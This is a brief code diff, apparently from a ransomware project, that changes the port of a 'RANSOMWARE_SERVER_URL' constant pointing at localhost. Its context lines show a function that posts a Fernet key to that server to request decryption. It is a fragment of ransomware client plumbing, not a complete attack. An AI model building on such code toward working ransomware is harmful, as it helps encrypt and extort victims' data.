@@ -1,6 +1,6 @@
 from aiohttp import ClientSession
 
-RANSOMWARE_SERVER_URL='http://127.0.0.1:443'
+RANSOMWARE_SERVER_URL='http://127.0.0.1:8075'
 
 async def request_fernet_decryption(fernet_key, transation_id):
     fernet = await __post(f'{RANSOMWARE_SERVER_URL}/{transation_id}', data=fernet_key)
